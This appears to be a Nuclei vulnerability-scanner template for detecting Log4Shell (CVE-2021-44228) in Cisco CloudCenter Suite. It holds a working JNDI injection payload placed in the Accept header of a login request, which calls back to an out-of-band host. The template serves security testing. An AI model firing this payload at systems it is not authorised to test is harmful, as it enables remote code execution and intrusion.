id: cisco-cloudcenter-log4j-rce
info:
  name: Cisco CloudCenter Suite log4j2 RCE (CVE-2021-44228)
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    Cisco CloudCenter Suite has a log4j2 remote command execution vulnerability. Attackers can exploit this vulnerability to execute arbitrary commands on the server-side, gaining server permissions and potentially taking control of the web server.
  reference:
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228
    - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
  classification:
    cvss-metrics: "3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"
    cvss-score: 10.0
    cve-id: CVE-2021-44228
  tags: rce,cve,log4j

variables:
  ldap_url: "{{interactsh-url}}"

http:
  - raw:
      - |
        POST /suite-auth/login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json;charset=utf-8
        Accept: application/json, text/plain, */${jndi:ldap://{{ldap_url}}}

        {"username":"111@test.com","password":"111","tenantName":"111"}
    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - dns
      - type: word
        part: interactsh_request
        words:
          - "jndi:ldap://"
